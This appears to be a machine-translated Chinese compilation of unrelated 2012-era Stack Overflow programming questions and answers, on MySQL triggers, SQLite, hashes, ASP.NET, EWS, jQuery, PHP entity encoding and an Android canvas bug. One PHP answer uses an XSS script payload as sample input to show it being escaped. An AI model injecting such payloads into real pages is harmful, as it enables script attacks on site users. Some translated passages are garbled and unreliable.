我在定义和使用 SERVER_IP 变量的方式上做错了什么，如下面的 Jenkins 工作配置片段所示：

![在此处输入图像描述](../Images/6be7a81ed7c7c0b11c4f6e63b7ec20c4.png)

![在此处输入图像描述](../Images/0ae0b60637ec3ad84cc4a0b6a0e88b41.png)

# mysql - MySQL：列计数与第 1 行的值计数不匹配

> ID：13280164
> 
> 赞同：2
> 
> 时间：2012-11-07T23:35:20.840
> 
> 标签：mysql, sql

对于冗长的代码，我深表歉意，但我正在尝试创建一个审计表（称为 aud_candles），它是“蜡烛”的副本，但具有一个新的唯一键 aud_can_id。在“蜡烛”上进行更新之前，我希望触发器将该行的当前状态保存在“aud_candles”中。

```
Target Server Type    : MySQL
Target Server Version : 50165
File Encoding         : utf-8

Date: 11/07/2012 23:05:38 PM
*/

SET NAMES utf8;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
--  Table structure for `candles`
-- ----------------------------
DROP TABLE IF EXISTS `candles`;
CREATE TABLE `candles` (
  `can_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `can_name` varchar(255) NOT NULL,
  `can_description` varchar(1024) NOT NULL,
  `can_dye_id` int(10) unsigned NOT NULL,
  `can_snt_id` int(10) unsigned NOT NULL,
  `can_wick_id` int(10) unsigned NOT NULL,
  `can_wax_id` int(10) unsigned NOT NULL,
  `can_retail_cost` float(10,2) NOT NULL,
  `can_materials_cost` float(10,2) NOT NULL,
  `can_dye_used` float(10,2) NOT NULL,
  `can_snt_used` float(10,2) NOT NULL,
  `can_wick_used` float(10,2) NOT NULL,
  `can_wax_used` float(10,2) NOT NULL,
  `can_updated` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`can_id`),
  KEY `idx_candles_dyes_id` (`can_dye_id`) USING BTREE,
  KEY `idx_candles_scents_id` (`can_snt_id`) USING BTREE,
  KEY `idx_candles_wax_id` (`can_wax_id`) USING BTREE,
  KEY `fk_candles_wick_id` (`can_wick_id`),
  CONSTRAINT `fk_candles_dye_id` FOREIGN KEY (`can_dye_id`) REFERENCES `dyes` (`dye_id`),
  CONSTRAINT `fk_candles_scent_id` FOREIGN KEY (`can_snt_id`) REFERENCES `scents` (`snt_id`),
  CONSTRAINT `fk_candles_wax_id` FOREIGN KEY (`can_wax_id`) REFERENCES `wax` (`wax_id`),
  CONSTRAINT `fk_candles_wick_id` FOREIGN KEY (`can_wick_id`) REFERENCES `wicks` (`wic_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;

delimiter ;;
CREATE TRIGGER `trg_audit_update_candles` BEFORE UPDATE ON `candles` FOR EACH ROW BEGIN  
    INSERT INTO aud_candles 
(can_id, 
can_name, 
can_description, 
can_dye_id, 
can_snt_id, 
can_wick_id, 
can_wax_id, 
can_materials_cost, 
can_retail_cost,
can_updated)  
    VALUES 
(OLD.can_id, 
OLD.can_name, 
OLD.can_description, 
OLD.can_dye_id, 
OLD.can_snt_id, 
OLD,can_wick_id, 
OLD.can_wax_id, 
OLD.can_materials_cost, 
OLD.can_retail_cost,
OLD.can_updated);  
END;
 ;;
delimiter ;

-- ----------------------------
--  Records of `candles`
-- ----------------------------
BEGIN;
INSERT INTO `candles` VALUES ('1', 'Test Name', 'Test Description', '12', '10', '102', '1', '0.00', '0.00', '5', '25.00', '15.00', '500.00', '2012-11-07 13:29:02');
COMMIT;

DROP TABLE IF EXISTS `aud_candles`;
CREATE TABLE `aud_candles` (
  `aud_can_id` int(11) NOT NULL AUTO_INCREMENT,
  `can_id` int(10) unsigned NOT NULL,
  `can_name` varchar(255) CHARACTER SET latin1 NOT NULL,
  `can_description` varchar(1024) CHARACTER SET latin1 NOT NULL,
  `can_dye_id` int(10) unsigned NOT NULL,
  `can_snt_id` int(10) unsigned NOT NULL,
  `can_wick_id` int(10) unsigned NOT NULL,
  `can_wax_id` int(10) unsigned NOT NULL,
  `can_retail_cost` float(10,2) NOT NULL,
  `can_materials_cost` float(10,2) NOT NULL,
  `can_dye_used` float(10,2) NOT NULL,
  `can_snt_used` float(10,2) NOT NULL,
  `can_wick_used` float(10,2) NOT NULL,
  `can_wax_used` float(10,2) NOT NULL,
  PRIMARY KEY (`aud_can_id`),
  KEY `idx_candles_dyes_id` (`can_dye_id`) USING BTREE,
  KEY `idx_candles_scents_id` (`can_snt_id`) USING BTREE,
  KEY `idx_candles_wax_id` (`can_wax_id`) USING BTREE,
  KEY `fk_candles_wick_id` (`can_wick_id`),
  CONSTRAINT `fk_aud_candles_dye_id` FOREIGN KEY (`can_dye_id`) REFERENCES `dyes` (`dye_id`),
  CONSTRAINT `fk_aud_candles_scent_id` FOREIGN KEY (`can_snt_id`) REFERENCES `scents` (`snt_id`),
  CONSTRAINT `fk_aud_candles_wax_id` FOREIGN KEY (`can_wax_id`) REFERENCES `wax` (`wax_id`),
  CONSTRAINT `fk_aud_candles_wick_id` FOREIGN KEY (`can_wick_id`) REFERENCES `wicks` (`wic_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8

SET FOREIGN_KEY_CHECKS = 1;

UPDATE candles set can_name = 'Test Name 2' WHERE can_id = 1; 
```

执行更新时，我收到：

错误

> 列计数与第 1 行的值计数不匹配

如果我删除触发器一切正常，那么它必须与触发器有关吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:00:03.040

我不知道这是否是拼写错误，但您在子句中的某处使用了 use`comma`而不是`period``values`

```
....
OLD.can_snt_id, 
OLD,can_wick_id,  -- << here, it should be period.
OLD.can_wax_id, 
... 
```

# sql - SQLite3 做一个 SELECT，按多个跨表列排序

> ID：13280165
> 
> 赞同：3
> 
> 时间：2012-11-07T23:35:26.160
> 
> 标签：sql, database, sqlite

我正在尝试从 3 个表中生成一个“历史/日志页面”，表如下所示：

## 表A

```
CreationDate
ModifDate
LastAccessedDate
FileName 
```

## 表B

```
Guid_TableA
CreationDate
ModifDate
LastAccessedDate
FileName 
```

## 表C

```
Guid_TableA
LastModifDate
FileName 
```

FWIW，尽管列名相似，但**这些表中的日期之间没有关系**。它们之间唯一相关的有效列是**Guid_TableA**

## 我想要的是...

选择记录并按日期排序。**我正在尝试构建事件日志，因此返回这样的重复条目是有效的**（只要结果按日期正确排序）

```
(TableA)  file-1.txt    '01/01/2012 00:00:00' (CreationDate)
(TableA)  file-1.txt    '01/01/2012 00:00:01' (ModifDate)
(TableB)  file-2.txt    '01/01/2012 00:00:02' (CreationDate)
(TableA)  file-1.txt    '01/01/2012 00:00:03' (LastAccessedDate) 
```

希望我的意图很明确；我基本上想选择按日期排序的记录（即针对多个交叉表列排序，**包括重复的条目**）

**我的问题是：**这可能吗？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T00:02:00.617

您想使用[`UNION ALL`](http://www.sqlite.org/lang_select.html#compound)运算符来合并多个选择的结果：

```
SELECT FileName, CreationDate AS Date FROM TableA
UNION ALL SELECT FileName, ModifDate FROM TableA
UNION ALL SELECT FileName, LastAccessDate FROM TableA
UNION ALL SELECT FileName, CreationDate FROM TableB
-- ...etc
ORDER BY Date; 
```

如果您想要那些“TableA”和“CreationDate”注释，您也可以将它们添加为文字字符串：

```
SELECT 'TableA', FileName, CreationDate AS Date, 'CreationDate' FROM TableA
UNION ALL SELECT 'TableA', FileName, ModifDate, 'ModifDate' FROM TableA
UNION ALL SELECT 'TableA', FileName, LastAccessDate, 'LastAccessDate' FROM TableA
UNION ALL SELECT 'TableB', FileName, CreationDate, 'CreationDate' FROM TableB
-- ...etc
ORDER BY Date; 
```

这给了我：

```
TableA|file-1.txt|01/01/2012 00:00:00|CreationDate
TableA|file-1.txt|01/01/2012 00:00:01|ModifDate
TableB|file-2.txt|01/01/2012 00:00:02|CreationDate
TableA|file-1.txt|01/01/2012 00:00:03|LastAccessDate 
```

# hash - 来自已知输入和输出的逆向工程散列函数

> ID：13280175
> 
> 赞同：2
> 
> 时间：2012-11-07T23:36:22.720
> 
> 标签：hash

这个概念实际上非常简单，涉及从已知的输入和输出中找出散列函数。

有没有可以快速找到这些信息的工具（我在 linux 上）？

例子：

> 秘密-fc683cd9ed1990ca2ea10b84e5e6fba048c24929

知道上面的两个值，这个假设的机器会打印出**sha1sum**。

原谅我的初学者心态，我是新手，在空闲时间学习这个话题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T23:42:33.583

假设输入字符串 X 保证产生输出哈希 Y，您可以构建一个使用每种编码类型的程序。

伪代码：

```
hash = "fc683cd9ed1990ca2ea10b84e5e6fba048c24929";
input = "secret"

if (md5(input) == hash)
    return "md5";
else if (sha1(input) == hash)
    return "sha1";
//etc...
else
    return "Unknown" 
```

编辑：请参阅[为什么 MD5 哈希值不可逆？](https://stackoverflow.com/questions/330207/how-come-md5-hash-values-are-not-reversible)有关为什么不能“反转”诸如 md5 之类的哈希的更多信息。

编辑 2：我做了一些搜索，发现了这个：[http](http://code.google.com/p/hash-identifier/) ://code.google.com/p/hash-identifier/ - 它看起来很全面，所以看看。

# asp.net-mvc-4 - ASP.NET Web API 架构建议/反馈

> ID：13280179
> 
> 赞同：6
> 
> 时间：2012-11-07T23:37:05.577
> 
> 标签：asp.net-mvc-4, asp.net-web-api

目前，我面临构建一个 Web 服务的需求，该服务将让 Java 客户端通过 httprequest 检索和触发对我们数据的操作。我们是一家 .Net 商店，看来最新的解决方案是 Microsoft 的 MVC4 Web API。我已经习惯了您的标准分层架构，我已经从 API 中提取数据，但这将是我第一个提供数据的 Web 服务。

从我的研究中，我看到了以下建议：

*   将逻辑和数据访问分离到一个单独的项目类型类库中。
*   使用您的控件访问数据和执行逻辑。
*   使用您的模型访问数据并执行逻辑。

我正在寻找具有 MVC4 Web API 经验的人，他可以阐明以这种方式构建 Web 服务的良好实践。

提前致谢。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-08T09:02:25.767

首先，请务必将您的 ASP.NET Web API 逻辑放入一个单独的项目中。这将为您提供托管层的灵活性（因为 ASP.NET Web API 是托管不可知论者），它只会使整个项目变得干净。假设您的项目名称是 MyProject。您可以将 API 项目命名为，`MyProject.API`并且可以将`Microsoft.AspNet.WebApi.Core`NuGet 包安装到此项目中。

我还建议您也分离您的域层（POCO 实体、存储库、您的服务层片段等）。让我们称之为`MyProject.Domain`. 然后，您将从项目中引用此`MyProject.Domain`项目`MyProject.API`。

我不建议您将所有 POCO 实体转储到您的 API 中。因此，我肯定会使用数据传输对象 (Dto)。您可以使用诸如 autoMapper 之类的第三方工具将您的实体类映射到您的 Dto。但是，请务必将您的 Dtos、请求命令、请求模型放入单独的项目中。您将从项目中引用`MyProject.API.Model`项目`MyProject.API`。我们为什么要为此创建一个单独的项目？因为，稍后如果您决定为您的 HTTP API 构建一个 .NET 客户端包装器，您可以轻松地引用此项目以将它们与您的 .NET 客户端一起使用。我们称这个项目为`MyProject.API.Model`。

最后，我们的 API 需要一个托管层。假设你想在 ASP.NET 下托管这个项目，你可以通过 Empty Web Application 模板创建一个新项目，我们称之为这个项目`MyProject.API.WebHost`。然后，您可以将`Microsoft.AspNet.WebApi`包安装到此项目中。在这个项目中，您将引用`MyProject.API`,`MyProject.API.Model`和`MyProject.Domain`项目。该项目是您应该部署到服务器的项目。

如果您想为您的 HTTP API 创建一个 .NET 包装器，您可以创建另一个名为的项目`MyProject.API.Client`并将包安装`Microsoft.AspNet.WebApi.Client`到这个项目中。您还可以`MyProject.API.Model`从这个项目中引用该项目，以便您可以反序列化为强类型对象并从强类型对象中序列化。

这是我一直在使用的项目的解决方案资源管理器的屏幕截图：

![在此处输入图像描述](../Images/3b54caa8b7cca25dbf0fb01b9233dbf1.png)

希望这能给你一些想法。

# exchangewebservices - EWS 创建约会返回 401 未经授权的错误

> ID：13280184
> 
> 赞同：2
> 
> 时间：2012-11-07T23:37:36.000
> 
> 标签：exchangewebservices

有人知道为什么我在调用 EWS Web 服务 URL 以创建约会项目时返回 401 未经授权的错误吗？我可以得到 service.AutodiscoverUrl 运行良好，但是在保存约会项目时它会出错。

我正在使用 Outlook10、Exchange 2010 和 EWS v2.0，这是我的代码：

```
ExchangeService service = new ExchangeService(ExchangeVersion.Exchange2010);

ServicePointManager.ServerCertificateValidationCallback = CertificateValidationCallBack;
                ServicePointManager.ServerCertificateValidationCallback = CertificateValidationCallBack;
service.Credentials = new WebCredentials("myemail", "mypassword", "mydomain.com"); 
    service.Url = new Uri("https://myEWSDomain/EWS/Exchange.asmx");
    service.AutodiscoverUrl("myemail", RedirectionUrlValidationCallback2);

Appointment appointment = new Appointment(service);
appointment.Subject = "Testing";
appointment.Start = DateTime.Now;
appointment.End = appointment.Start.AddHours(1);
appointment.RequiredAttendees.Add("user@test.com");
appointment.Save(SendInvitationsMode.SendOnlyToAll); 
```

非常感谢任何帮助。

谢谢

回声

# google-app-engine - Google 数据存储性能：2 次获取 vs 1 次过滤查询

> ID：13280186
> 
> 赞同：1
> 
> 时间：2012-11-07T23:37:53.050
> 
> 标签：google-app-engine, google-cloud-datastore

使用 GAE 数据存储，以下哪个选项的性能最好？（假设 memcache 不可用）

选项1：数据模型：实体用户有一些密钥，和一个电子邮件地址（电子邮件不能用作密钥）

a) 对通过电子邮件过滤匹配的用户执行查询

或选项 2：

DataModel：实体用户有一些密钥，实体用户登录有电子邮件地址作为密钥，用户密钥

a) 对 UserLogin 执行 get，然后
b) 使用 UserLogin 中的用户密钥对 User 执行 get

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T10:12:58.927

获取操作比查询快得多，更不用说执行成本更低了。两个 get 操作的顺序可能比单个查询更快。例如，在状态仪表板上，[get 操作](http://code.google.com/status/appengine/detail/datastore/2012/11/08#ae-trust-detail-datastore-get-latency)悬停在 10 毫秒左右，而[查询操作](http://code.google.com/status/appengine/detail/datastore/2012/11/08#ae-trust-detail-datastore-query-latency)悬停在 80 毫秒左右 - 但如果这对您很重要，我鼓励您对两者进行基准测试并自己验证。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T05:10:37.903

我相信选项 1 会更快，因为在选项 2 中您执行一个操作，得到结果，然后才执行第二个操作。

但是，差异可以忽略不计，除非您每天至少进行几百万次。

# javascript - jQuery .on 使用事件委托处理多个事件

> ID：13280187
> 
> 赞同：0
> 
> 时间：2012-11-07T23:37:53.713
> 
> 标签：javascript, jquery

使用 jQuery 1.8.2 使用事件委托将多个事件绑定到单个类：

```
$(document).on("focus blur", ".myClass", function() {
    console.log("Ba da boom.");
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T03:13:31.077

您可以使用地图链接多个事件或附加多个事件。

**链接多个 ons**：

例子：

```
$(document).on("focus", ".myClass", function(){
    //do something
}).on("blur", ".myClass",  function(){
    //do something else
}); 
```

演示：http: [//jsfiddle.net/MG8S7/4/](http://jsfiddle.net/MG8S7/4/)

**使用 Map 附加事件**：

例子：

```
$(".myClass").on({
  focus: function(){
   //do something
  },
  blur: function(){
    //do something else
  },
  mouseenter: function(){
    //do one more thing
  }   
}); 
```

演示：http: [//jsfiddle.net/MG8S7/9/](http://jsfiddle.net/MG8S7/9/)

希望这可以帮助！

# c++ - 如何从 C++ 代码刷新系统托盘图标？

> ID：13280191
> 
> 赞同：2
> 
> 时间：2012-11-07T23:38:23.103
> 
> 标签：c++, winapi, system-tray

> **可能重复：**
> [您能否向 Windows 资源管理器发送信号以使其刷新系统托盘图标？](https://stackoverflow.com/questions/74723/can-you-send-a-signal-to-windows-explorer-to-make-it-refresh-the-systray-icons)

在卸载过程中，当应用程序崩溃时，如果它有一个系统托盘图标，该图标将保留在系统托盘上，并且不会随着崩溃的进程一起被删除。有没有办法从 C++ 代码刷新系统托盘以删除这个工件？

PS。我不是编写崩溃应用程序的人，所以我无法修复它。

# c++ - c ++生成带有O和X的二维数组

> ID：13280192
> 
> 赞同：1
> 
> 时间：2012-11-07T23:38:30.057
> 
> 标签：c++

我需要帮助尝试使用 O 和 X 生成 2D 数组（20x20 网格）。稍后我将用图像替换这些以构建某种地图/网格。但我只需要用字符而不是整数填充它们。

到目前为止我有这个：

```
 char array[20][20];

srand(time(NULL));

for(int i=0;i<20;i++)
 {
     for(int j=0;j<20;j++) {
         array[i][j]= ((rand() % 2) == 0) ? 'O' : 'X';
     }
 } 
```

我不知道格式是否正确，因为代码对我来说很奇怪，但如果我有这个权利。当我运行它时，我究竟如何打印出来？我无法测试它，因为我不知道如何打印出来：/但我觉得我还是错了。

编辑然后我还需要知道如何垂直交换多维数组......仍然保持相同的值/网格设置，但基本上只是垂直反映它。虽然不是水平的..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T23:41:06.583

你有正确的一代部分。至于打印，使用

```
for(int i = 0; i < 20; ++i)
{
    for(int j = 0; j < 20; ++j)
    {
        std::cout << array[i][j];
    }
    std::cout << "\n";
} 
```

# php - 将 CSV 导入并更新到 MySQL

> ID：13280193
> 
> 赞同：2
> 
> 时间：2012-11-07T23:38:32.003
> 
> 标签：php, mysql, csv

我有一个场景，客户端每天更新/插入一个 CSV 文件，该文件通常大约 30,000 到 50,000 行。此 CSV 将包含新的导入以及需要更新现有行的能力。

我正在使用 PHP / MySQL。

目前我必须检查 CSV 的每一行并与数据库中的内容进行比较。

这显然需要很长时间。

如果数据库中没有任何内容，它会直接导入，这本身就很快。

我考虑过临时表和连接，但不知道与更新相比如何处理新行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:40:58.393

将 csv 数据导入 MySQL 的选项很少：

*   [`mysqlimport`](http://dev.mysql.com/doc/refman/5.0/en/mysqlimport.html)- 在这里您可以使用`--ignore`或`--replace`选项。以下参考手册：

> `--replace`和`--ignore`选项控制在唯一键值上重复现有行的输入行的处理。如果您指定 `--replace`，新行将替换具有相同唯一键值的现有行。如果您指定`--ignore`，将跳过与唯一键值上的现有行重复的输入行。如果您不指定任一选项，则在找到重复键值时会发生错误，并且文本文件的其余部分将被忽略。

*   同样，[`LOAD DATA INFILE`](http://dev.mysql.com/doc/refman/5.1/en/load-data.html) 您还可以指定选项`IGNORE`或`REPLACE`：如果指定`REPLACE`，输入行替换现有行，如果指定 IGNORE，则跳过与唯一键值上的现有行重复的输入行。

如果您使用`LOAD DATA INFILE`. 但这仅适用于不使用`IGNORE`or`REPLACE`选项的情况。

# android - 手机 Android HTML5 硬件加速 - 画布

> ID：13280195
> 
> 赞同：4
> 
> 时间：2012-11-07T23:38:49.237
> 
> 标签：android, cordova, canvas

我有一个奇怪的问题。当我启用硬件加速时，如果我正在绘制到画布元素，则在画布上绘制的任何内容都将重新绘制到页面顶部。

如果我关闭硬件加速，则不会出现此问题。

我只在 Android 4.1.1 上亲自测试过它，但我之前在我们的一个用户身上注意到了这个问题，我无法复制（他们至少在 Android 3+ 上）

我无法准确地截取屏幕截图（不太确定如何在 Android 上执行此操作），但我会尝试分解该过程。

**启用硬件加速**

1.  用户填写通常的详细信息。
2.  用户滚动到页面底部，在画布元素上绘制一个签名。
3.  如果用户忘记了页面顶部的某些内容并滚动到页面顶部
4.  出现视觉错误，他们绘制的签名出现在页面顶部

**但是，如果没有硬件加速**，则不会发生第 4 步。我应该对 HTML5 Canvas 做些什么吗？

我不确定我需要在这里传递什么信息——它似乎发生在三星、HTC 和谷歌 Nexus 手机/平板电脑上，所以它是一个一致的错误。

我试着四处搜索，但我总是最终得到游戏开发线程或类似的东西。

我真的很想启用硬件加速，这是唯一出现的问题 - 性能提升太不可思议了

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-31T17:22:00.310

Android 中重复的 HTML5 画布问题已在 4.1.1 版本中出现，并且尚未在最新的 4.2 中修复。

解决方案是画布的所有父 HTML 元素**都**不会**溢出：隐藏**或**溢出：滚动**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T05:20:11.733

好的，所以我想出了有史以来最HACKIEST的解决方案。在我的 onTouchEnd 事件触发后，我必须执行以下操作

```
1\. Append changes to the canvas. It'll double-draw
2\. Create a clone of the canvas
3\. remove the canvas, re-add it
4\. Copy the data from the clone over 
```

然后这个错误消失了......荒谬。

我必须让它工作，在删除硬件加速后我注意到 jQM 感觉有多么笨重

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-04T11:00:24.153

我有同样的问题。在我的情况下，似乎是由 jquery mobile css 引起的。

更详细地了解 Guya 添加的内容，转到 jquery.mobile.structure.css 文件并更改此行：

.ui-content { 边框宽度：0；溢出：可见；溢出-x：隐藏；填充：15px；}

至

.ui-content { 边框宽度：0；溢出：可见；填充：15px；}

删除 overflow-x: hidden 属性可以解决问题。

[资料来源：Github / thomasjbradley / signature-pad / Issues](https://github.com/thomasjbradley/signature-pad/issues/56)

编辑：奇怪的是，我注意到当画布宽度为 256 像素或更少时，问题并未发生。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-08-19T00:22:36.157

对于任何感兴趣的人来说，Android 5 的运行速度都非常惊人，canvas 的运行速度要快得多。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-09-26T07:55:37.280

我在创建视图时解决了这个问题：

```
if (Build.VERSION.SDK_INT >= 16) {
  try {
    Method method = root.getClass().getMethod("setLayerType", int.class, Paint.class);
    method.invoke(root, 0x01/* View.LAYER_TYPE_SOFTWARE */, null);
    Log.d(TAG, "hardware accelaration disabled");
  } catch ...
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-08-08T10:05:04.350

我正在使用[分段显示](http://www.3quarks.com/en/SegmentDisplay/)库，它也受此问题的影响。在与 lib 的作者长时间讨论后，他提出了一个快速的解决方法。他告诉我添加这两行：

```
context.fillStyle = '#fff';
context.fillRect(0, 0, display.width, display.height); 
```

在这一行之后：

```
// clear canvas
context.clearRect(0, 0, display.width, display.height); 
```

解决方案经过测试，效果很好。

通过对给定代码的快速分析，我假设透明 ( `clearRect`) 画布导致了这些问题，并将其更改为非透明 ( `fillRect`) 可修复错误。

# php - 将 unicode 转换为 html 实体十六进制

> ID：13280200
> 
> 赞同：6
> 
> 时间：2012-11-07T23:39:26.810
> 
> 标签：php, unicode, hex, html-entities

如何将 Unicode 字符串转换为 HTML 实体？（`HEX`不是十进制）

例如，转换`Français`为`Fran&#xE7;ais`.

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-08T00:35:44.220

对于[相关问题](https://stackoverflow.com/a/11310258/367456)中缺少的十六进制编码：

```
$output = preg_replace_callback('/[\x{80}-\x{10FFFF}]/u', function ($match) {
    list($utf8) = $match;
    $binary = mb_convert_encoding($utf8, 'UTF-32BE', 'UTF-8');
    $entity = vsprintf('&#x%X;', unpack('N', $binary));
    return $entity;
}, $input); 
```

这类似于@Baba 使用[UTF-32BE](http://en.wikipedia.org/wiki/UTF-32)[`unpack`](http://php.net/unpack)的答案，然后[`vsprintf`](http://php.net/vsprintf)是格式化需求。

如果您更喜欢[`iconv`](http://php.net/iconv)，[`mb_convert_encoding`](http://php.net/mb_convert_encoding)则类似：

```
$output = preg_replace_callback('/[\x{80}-\x{10FFFF}]/u', function ($match) {
    list($utf8) = $match;
    $binary = iconv('UTF-8', 'UTF-32BE', $utf8);
    $entity = vsprintf('&#x%X;', unpack('N', $binary));
    return $entity;
}, $input); 
```

我发现这个字符串操作比[Get hexcode of html entity](https://stackoverflow.com/q/7482977/367456)更清楚一些。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-08T00:15:58.990

您的字符串看起来像`UCS-4`您可以尝试的编码

```
$first = preg_replace_callback('/[\x{80}-\x{10FFFF}]/u', function ($m) {
    $char = current($m);
    $utf = iconv('UTF-8', 'UCS-4', $char);
    return sprintf("&#x%s;", ltrim(strtoupper(bin2hex($utf)), "0"));
}, $string); 
```

输出

```
string 'Fran&#xE7;ais' (length=13) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-02-09T06:30:07.643

首先，当我最近遇到这个问题时，我通过确保我的代码文件、数据库连接和数据库表都是 UTF-8 来解决它，然后，简单地回显文本即可。如果您必须从数据库中转义输出，请使用`htmlspecialchars()`而不是`htmlentities()`让 UTF-8 符号单独存在并且不尝试转义。

想记录一个替代解决方案，因为它为我解决了类似的问题。我正在使用 PHP`utf8_encode()`来转义“特殊”字符。

我想将它们转换为 HTML 实体以进行显示，我编写此代码是因为我想尽可能避免 iconv 或此类功能，因为并非所有环境都必须具有它们（如果不是这样，请纠正我！）

```
$foo = 'This is my test string \u03b50';
echo unicode2html($foo);

function unicode2html($string) {
    return preg_replace('/\\\\u([0-9a-z]{4})/', '&#x$1;', $string);
} 
```

希望这可以帮助有需要的人:-)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-07-15T17:08:27.720

请参阅[如何从 PHP 中的 unicode 代码点获取字符？](https://stackoverflow.com/questions/1365583/how-to-get-the-character-from-unicode-value-in-php/24755772#24755772)对于一些允许您执行以下操作的代码：

## **示例使用**：

```
echo "Get string from numeric DEC value\n";
var_dump(mb_chr(50319, 'UCS-4BE'));
var_dump(mb_chr(271));

echo "\nGet string from numeric HEX value\n";
var_dump(mb_chr(0xC48F, 'UCS-4BE'));
var_dump(mb_chr(0x010F));

echo "\nGet numeric value of character as DEC string\n";
var_dump(mb_ord('ď', 'UCS-4BE'));
var_dump(mb_ord('ď'));

echo "\nGet numeric value of character as HEX string\n";
var_dump(dechex(mb_ord('ď', 'UCS-4BE')));
var_dump(dechex(mb_ord('ď')));

echo "\nEncode / decode to DEC based HTML entities\n";
var_dump(mb_htmlentities('tchüß', false));
var_dump(mb_html_entity_decode('tch&#252;&#223;'));

echo "\nEncode / decode to HEX based HTML entities\n";
var_dump(mb_htmlentities('tchüß'));
var_dump(mb_html_entity_decode('tch&#xFC;&#xDF;'));

echo "\nUse JSON encoding / decoding\n";
var_dump(codepoint_encode("tchüß"));
var_dump(codepoint_decode('tch\u00fc\u00df')); 
```

## **输出**：

```
Get string from numeric DEC value
string(4) "ď"
string(2) "ď"

Get string from numeric HEX value
string(4) "ď"
string(2) "ď"

Get numeric value of character as DEC int
int(50319)
int(271)

Get numeric value of character as HEX string
string(4) "c48f"
string(3) "10f"

Encode / decode to DEC based HTML entities
string(15) "tch&#252;&#223;"
string(7) "tchüß"

Encode / decode to HEX based HTML entities
string(15) "tch&#xFC;&#xDF;"
string(7) "tchüß"

Use JSON encoding / decoding
string(15) "tch\u00fc\u00df"
string(7) "tchüß" 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-07-21T15:01:11.880

您还可以使用`mb_encode_numericentity`PHP 4.0.6+ 支持的版本（[链接到 PHP 文档](https://www.php.net/manual/en/function.mb-encode-numericentity.php)）。

```
function unicode2html($value) {
    return mb_encode_numericentity($value, [
    //  start codepoint
    //  |       end codepoint
    //  |       |       offset
    //  |       |       |       mask
        0x0000, 0x001F, 0x0000, 0xFFFF,
        0x0021, 0x002C, 0x0000, 0xFFFF,
        0x002E, 0x002F, 0x0000, 0xFFFF,
        0x003C, 0x003C, 0x0000, 0xFFFF,
        0x003E, 0x003E, 0x0000, 0xFFFF,
        0x0060, 0x0060, 0x0000, 0xFFFF,
        0x0080, 0xFFFF, 0x0000, 0xFFFF
    ], 'UTF-8', true);
} 
```

通过这种方式，还可以指示将哪些字符范围转换为十六进制实体以及将哪些字符保留为字符。

使用示例：

```
$input = array(
    '"Meno più, PIÙ o meno"',
    '\'ÀÌÙÒLÈ PERCHÉ perché è sempre così non si sà\'',
    '<script>alert("XSS");</script>',
    '"`'
);

$output = array();
foreach ($input as $str)
    $output[] = unicode2html($str) 
```

结果：

```
$output = array(
    '&#x22;Meno pi&#xF9;&#x2C; PI&#xD9; o meno&#x22;',
    '&#x27;&#xC0;&#xCC;&#xD9;&#xD2;L&#xC8; PERCH&#xC9; perch&#xE9; &#xE8; sempre cos&#xEC; non si s&#xE0;&#x27;',
    '&#x3C;script&#x3E;alert&#x28;&#x22;XSS&#x22;&#x29;;&#x3C;&#x2F;script&#x3E;',
    '&#x22;&#x60;'
); 
```

# jquery - 用复选框替换所有内容并在jQuery中取消取消

> ID：13280201
> 
> 赞同：0
> 
> 时间：2012-11-07T23:39:47.007
> 
> 标签：jquery, forms, revert

```
<div>
    <div class="first">First Name</div>
    <div class="last">Last Name</div>

    <div class="edit">edit</div>
</div> 
```

按下编辑时，我希望将 .first 和 .last 中的内容替换为文本框，其中包含文本框内 div 的内容。本质上，使内容明显可编辑。

我能够通过 replaceWith 实现这一点。

但是，如果他们单击“编辑”然后想取消，我需要文本框消失并显示原始内容。我意识到 replaceWith 会破坏现有结构。

我有使用克​​隆的想法，但我不确定这是否有效。

用 jQuery 解决这个问题的最佳方法是什么？

我发现this [how to make jquery-ui.dialog revert an form on cancel](https://stackoverflow.com/questions/6032410/how-to-make-jquery-ui-dialog-revert-a-form-on-cancel)这似乎做了一些类似于我需要的事情，但我无法在其中找到任何有助于做我想做的事情。

非常感谢，期待回复！

雅各布

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T01:11:50.857

这是一个小提琴：http: [//jsfiddle.net/manishie/pZHMN/](http://jsfiddle.net/manishie/pZHMN/)

它可以使用一些重构，但它会做你想要的。基本上，您将原始值保存为封闭 div 的数据属性。如果用户保存，则保存新值。如果用户取消，您从数据属性中获取旧值并将其放回原处。

HTML：

```
<form id="theform">
    <div>
        <div class="first editable">First Name</div>
        <div class="last editable">Last Name</div>

        <div class="edit">edit</div>
        <div class="save" style="display:none;">save</div>
        <div class="cancel" style="display:none;">cancel</div>
    </div>
</form>​ 
```

Javascript：

```
$('.edit').click(function() {
    $('.edit').hide();
    $('.save,.cancel').show();

    $('.editable').each(function(index, el) {
        $(el).attr('data-orig', $(el).html());           
